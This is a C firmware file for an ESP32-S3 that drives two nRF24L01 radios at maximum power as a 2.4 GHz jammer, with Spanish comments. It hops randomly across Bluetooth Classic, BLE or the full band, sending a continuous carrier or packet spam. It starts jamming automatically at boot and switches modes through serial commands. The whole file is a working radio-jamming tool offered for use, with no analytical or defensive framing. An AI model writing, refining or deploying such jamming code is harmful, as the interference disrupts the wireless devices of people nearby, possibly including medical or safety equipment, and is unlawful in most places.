#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/uart.h"
#include "esp_log.h"
#include "esp_random.h"
#include "rom/ets_sys.h"
#include "nrf24_hal.h"

static const char *TAG = "JAMMER_BESTIA";

// ═══════════ RADIO 1 — SPI2 (IOMUX real) ═══════════
#define R1_CE    GPIO_NUM_9
#define R1_CSN   GPIO_NUM_10
#define R1_SCK   GPIO_NUM_12
#define R1_MOSI  GPIO_NUM_11
#define R1_MISO  GPIO_NUM_13
#define R1_IRQ   GPIO_NUM_8

// ═══════════ RADIO 2 — SPI3 (GPIO matrix) ═══════════
#define R2_CE    GPIO_NUM_15
#define R2_CSN   GPIO_NUM_7
#define R2_SCK   GPIO_NUM_4
#define R2_MOSI  GPIO_NUM_5
#define R2_MISO  GPIO_NUM_6
#define R2_IRQ   GPIO_NUM_16

static nrf24_dev_t radio1, radio2;

typedef enum {
    MODE_STOP,
    MODE_BT_ALL,   // ch 2..80  -> BT Classic + BLE data
    MODE_BLE,      // ch 0..40  -> todo BLE
    MODE_FULL      // ch 0..125 -> todo 2.4GHz
} jam_mode_t;

static jam_mode_t current_mode = MODE_STOP;
static volatile bool jamming_active = false;
static volatile uint32_t dwell_us = 200;

// ═══════════ CONFIG MÁXIMA POTENCIA ═══════════
static void nrf24_configure_max_power(nrf24_dev_t *dev) {
    nrf24_write_reg(dev, NRF24_REG_CONFIG,
                    NRF24_CFG_PWR_UP | NRF24_CFG_CRC_2B | NRF24_CFG_EN_CRC);
    nrf24_write_reg(dev, NRF24_REG_EN_AA, 0x00);
    nrf24_write_reg(dev, NRF24_REG_EN_RXADDR, 0x00);
    nrf24_write_reg(dev, NRF24_REG_SETUP_RETR, 0x00);
    nrf24_write_reg(dev, NRF24_REG_SETUP_AW, 0x03);
    dev->current_pa = NRF24_PA_MAX;
    dev->current_dr = NRF24_DR_2MBPS;
    nrf24_start_carrier(dev, 2);
}

// true = clon Si24R1 (el CW no funciona en ellos)
static bool detect_clone(nrf24_dev_t *dev) {
    nrf24_write_reg(dev, NRF24_REG_RF_SETUP, 0x20);  // 250kbps: solo Nordic real
    uint8_t rb = nrf24_read_reg(dev, NRF24_REG_RF_SETUP);
    nrf24_write_reg(dev, NRF24_REG_RF_SETUP, dev->current_pa | dev->current_dr);
    return (rb & 0x20) == 0;
}

// ═══════════ TAREA JAMMER (core 1, con vTaskDelay para el WDT) ═══════════
static void jammer_task(void *pv) {
    while (1) {
        if (!jamming_active || (!radio1.present && !radio2.present)) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        for (int i = 0; i < 10 && jamming_active; i++) {
            switch (current_mode) {
            case MODE_BT_ALL:
                if (radio1.present) nrf24_hop_random(&radio1, 2, 40);
                if (radio2.present) nrf24_hop_random(&radio2, 41, 80);
                break;
            case MODE_BLE:
                if (radio1.present) nrf24_hop_random(&radio1, 0, 20);
                if (radio2.present) nrf24_hop_random(&radio2, 20, 40);
                break;
            case MODE_FULL:
                if (radio1.present) nrf24_hop_random(&radio1, 0, 62);
                if (radio2.present) nrf24_hop_random(&radio2, 63, 125);
                break;
            default:
                break;
            }
            ets_delay_us(dwell_us);
        }
        vTaskDelay(pdMS_TO_TICKS(1));   // ← deja correr IDLE, alimenta el WDT
    }
}

void app_main(void) {
    ESP_LOGI(TAG, "=== JAMMER 2x NRF24 PA+LNA - ESP32-S3 N16R8 ===");

    nrf24_pins_t r1 = { .spi_host = SPI2_HOST, .pin_ce = R1_CE, .pin_csn = R1_CSN,
        .pin_sck = R1_SCK, .pin_mosi = R1_MOSI, .pin_miso = R1_MISO, .pin_irq = R1_IRQ };
    nrf24_pins_t r2 = { .spi_host = SPI3_HOST, .pin_ce = R2_CE, .pin_csn = R2_CSN,
        .pin_sck = R2_SCK, .pin_mosi = R2_MOSI, .pin_miso = R2_MISO, .pin_irq = R2_IRQ };

    if (nrf24_init(&radio1, &r1) == ESP_OK) {
        if (radio1.present) nrf24_configure_max_power(&radio1);
    } else {
        ESP_LOGE(TAG, "Radio1 FAIL. CE=9 CSN=10 SCK=12 MOSI=11 MISO=13");
    }

    if (nrf24_init(&radio2, &r2) == ESP_OK) {
        if (radio2.present) nrf24_configure_max_power(&radio2);
    } else {
        ESP_LOGE(TAG, "Radio2 FAIL. CE=15 CSN=7 SCK=4 MOSI=5 MISO=6");
    }

    // Detección de clon: si es Si24R1 -> spam automático
    if (radio1.present && detect_clone(&radio1)) {
        ESP_LOGW(TAG, "Radio1 = CLON Si24R1 -> modo SPAM automático");
        nrf24_set_spam(&radio1, true);
    } else if (radio1.present) {
        ESP_LOGI(TAG, "Radio1 = Nordic genuino -> modo CW");
    }

    if (radio2.present && detect_clone(&radio2)) {
        ESP_LOGW(TAG, "Radio2 = CLON Si24R1 -> modo SPAM automático");
        nrf24_set_spam(&radio2, true);
    } else if (radio2.present) {
        ESP_LOGI(TAG, "Radio2 = Nordic genuino -> modo CW");
    }

    // Pinchada al CORE 1 (el core 0 queda libre para WiFi/BT/IDLE)
    xTaskCreatePinnedToCore(jammer_task, "jammer", 4096, NULL, 5, NULL, 1);

    uart_driver_install(UART_NUM_0, 256, 0, 0, NULL, 0);
    vTaskDelay(pdMS_TO_TICKS(500));

    // ═══════════ AUTO-START ═══════════
    current_mode = MODE_BT_ALL;
    jamming_active = true;
    printf("\n>>> AUTO-START: barrido aleatorio BT ch 2-80, 2 radios, PA_MAX\n");
    printf(">>> dwell=%lu us | 1=BT  2=BLE  3=FULL  c=CW/SPAM  +/-=dwell  x=STOP\n\n",
           (unsigned long)dwell_us);

    uint8_t cmd;
    while (1) {
        if (uart_read_bytes(UART_NUM_0, &cmd, 1, pdMS_TO_TICKS(100)) <= 0) continue;

        switch (cmd) {
        case '1': current_mode = MODE_BT_ALL; jamming_active = true;
                  printf(">>> MODO BT (ch 2-80, 2 radios)\n"); break;
        case '2': current_mode = MODE_BLE; jamming_active = true;
                  printf(">>> MODO BLE (ch 0-40)\n"); break;
        case '3': current_mode = MODE_FULL; jamming_active = true;
                  printf(">>> MODO FULL (ch 0-125)\n"); break;
        case 'c':
                  if (radio1.present) nrf24_set_spam(&radio1, !radio1.spam);
                  if (radio2.present) nrf24_set_spam(&radio2, !radio2.spam);
                  printf(radio1.spam ? ">>> MODO SPAM (paquetes 2MHz)\n"
                                     : ">>> MODO CW (carrier puro)\n"); break;
        case '+': if (dwell_us < 600) dwell_us += 50;
                  printf(">>> dwell=%lu us\n", (unsigned long)dwell_us); break;
        case '-': if (dwell_us > 100) dwell_us -= 50;
                  printf(">>> dwell=%lu us\n", (unsigned long)dwell_us); break;
        case 'x': jamming_active = false;
                  if (radio1.present) nrf24_stop_carrier(&radio1);
                  if (radio2.present) nrf24_stop_carrier(&radio2);
                  printf(">>> STOP\n"); break;
        }
    }
}
